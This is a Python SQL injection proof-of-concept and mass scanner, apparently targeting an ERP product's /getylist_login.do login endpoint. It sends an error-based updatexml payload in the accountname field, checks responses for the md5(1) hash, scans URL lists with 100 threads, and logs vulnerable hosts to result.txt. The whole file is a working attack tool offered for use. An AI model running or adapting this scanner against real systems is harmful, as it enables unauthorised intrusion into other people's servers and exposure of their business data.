import requests,argparse,sys
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """"

███████╗██████╗ ██████╗ ███████╗ ██████╗ ██╗     
██╔════╝██╔══██╗██╔══██╗██╔════╝██╔═══██╗██║     
█████╗  ██████╔╝██████╔╝███████╗██║   ██║██║     
██╔══╝  ██╔══██╗██╔═══╝ ╚════██║██║▄▄ ██║██║     
███████╗██║  ██║██║     ███████║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                        
                             version:1.0
    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='ERPSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    #构造的POC
    url = target+'/getylist_login.do'
    headers = {
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Connection": "close",
        "Content-Length": "77",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
	}
    data = {
        'accountname': "test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--"
    }
    # res = requests.get(url,verify=False,timeout=5)
    try:
        res1 = requests.post(url,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 500:
            if 'c4ca4238a0b923820dcc509a6f75849' in res1.text:
                print(f"[+]该url存在漏洞{target}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target+"\n")
            else:
                print(f"[-]该url不存在漏洞{target}")
    except Exception as e:
        print(f"[*]该url存在问题{target}"+e)

if __name__ == '__main__':
    main()